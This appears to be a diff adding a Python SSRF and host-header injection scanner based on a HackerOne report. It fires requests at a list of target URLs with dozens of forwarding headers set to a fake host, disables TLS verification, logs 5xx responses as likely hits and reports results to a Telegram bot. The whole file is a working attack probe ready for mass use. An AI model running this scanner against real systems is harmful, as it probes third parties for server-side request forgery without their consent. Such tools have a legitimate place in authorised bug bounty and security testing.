@@ -1,0 +1,97 @@
+#!/usr/bin/python3
+#_*_ coding: utf8 _*_
+
+#Coded by https://twitter.com/JoshuaProvoste
+#Based on https://hackerone.com/reports/727330
+
+import os
+import requests
+import argparse
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-H','--headers', type=str, required=True, help='Readable file with custom HTTP headers for browser and session emulation')
+parser.add_argument('-T','--target', type=str, required=True, help='Readable file with multiple URLs previously validated')
+args = parser.parse_args()
+
+def bot_telegram(bot_message,bot_token,bot_id):
+    send_text = 'https://api.telegram.org/bot'+bot_token+'/sendMessage?chat_id='+bot_id+'&parse_mode=Markdown&text='+bot_message
+    response = requests.get(send_text)
+    return response
+def stderr_log(target,e):
+    log = open('stderr_log_ssrf.txt', 'a')
+    log.write('[-] Unexpected error with this URL: '+target+' Error: '+e+'\n')
+    log.close()
+    return print('[-] Unexpected error with this URL: '+target+' Error: '+e)
+def stdout_log(status_code,ssrf,target):
+    log = open('stdout_log_ssrf.txt', 'a')
+    log.write('[+] Status: '+status_code+' Header: '+ssrf+' URL: '+target+'\n')
+    log.close()
+    return print('[+] Status: '+status_code+' Header: '+ssrf+' URL: '+target)
+
+bot_token = os.environ.get('bot_token')
+bot_id = os.environ.get('bot_id')
+
+file_headers = open(args.headers,'r').readlines()
+file_headers = [x.strip().replace(' ','') for x in file_headers if x and ":" in x]
+file_headers_dict = {}
+
+for file_header in file_headers:
+    h = file_header.split(':')[0]
+    v = file_header.split(':')[1]
+    file_headers_dict.update({h:v})
+
+forwarded_headers = ['Forwarded','X-Forwarded','X-Forwarded-Host','X-Forwarded-By','X-Forwarded-For','X-Forwarded-Server','X-Real-IP','X-Forwarded-Proto','X-Forwarded-For-Original','X-Forward-For','Forwarded-For-IP','X-Originating-IP','X-Forwarded-For-IP','X-Forwarded-Port','X-Remote-IP','X-Remote-Addr','X-Remote-Host','X-Server-Name','X-Client-IP','Client-Ip','X-Host','Origin','Access-Control-Allow-Origin','X-ProxyUser-Ip','X-Cluster-Client-Ip','CF-Connecting-IP','True-Client-IP','X-Backend-Host','X-BlueCoat-Via','X-Forwared-Host','X-From-IP','X-Gateway-Host','X-Ip','X-Original-Host','X-Original-IP','X-Original-Remote-Addr','X-Original-Url','X-Originally-Forwarded-For','X-ProxyMesh-IP','X-True-Client-IP','Proxy-Host','CF-ipcountry','Remote-addr','Remote-host','X-Backend-Server','HTTP-Host','Local-addr','X-CF-URL','Fastly-Client-IP','Home','Host-Name','Host-Liveserver','X-Client-Host','X-Clientip','X-Forwarder-For','X-Machine','X-Network-Info','X-Orig-Client','Xproxy','X-Proxy-Url','Clientip','Hosti','Incap-Client-Ip','X-User','X-Source-IP']
+
+target_list = open(args.target,'r').readlines()
+target_list = [x.strip() for x in target_list]
+
+if (bot_token != None and bot_id != None):
+    for target in target_list:
+        for ssrf in forwarded_headers:
+            try:
+                file_headers_dict.update({'Host': target.split('/')[2]})
+                file_headers_dict.update({'Referer': target})
+                file_headers_dict.update({ssrf: 'fake.tld'})
+                r = requests.get(url=target,headers=file_headers_dict,verify=False,allow_redirects=False,timeout=5)
+                del file_headers_dict[ssrf]
+                status_code = str(r.status_code)
+                if status_code == '429':
+                    print('[-] Rate limit exception. Good bye!')
+                    bot_telegram('[-] Scan aborted by 429 Rate limit.',bot_token,bot_id)
+                    exit()
+                elif status_code[0] == '2':
+                    pass
+                elif status_code[0] == '3':
+                    pass
+                elif status_code[0] == '4':
+                    pass
+                else:
+                    stdout_log(status_code,ssrf,target)
+                    bot_telegram('[+] Status: '+status_code+' Header: '+ssrf+' URL: '+target,bot_token,bot_id)
+            except KeyboardInterrupt:
+                    print('Good bye!')
+                    exit()
+            except requests.exceptions.Timeout as e:
+                e = str(e)
+                stderr_log(target,e)
+                bot_telegram('[-] Unexpected error: '+e,bot_token,bot_id)
+                pass
+            except requests.exceptions.InvalidURL as e:
+                e = str(e)
+                stderr_log(target,e)
+                bot_telegram('[-] Unexpected error: '+e,bot_token,bot_id)
+                pass
+            except Exception as e:
+                e = str(e)
+                stderr_log(target,e)
+                bot_telegram('[-] Unexpected error: '+e,bot_token,bot_id)
+                pass
+    else:
+        print('[+] Scan finished. Good bye!')
+        bot_telegram('[+] Scan finished. Good bye!',bot_token,bot_id)
+        exit()
+else:
+    print('[-] This app requires 2 variable environments (token and id) for Telegram notifications. Example: export bot_token=token / export bot_id=id')
+    exit()
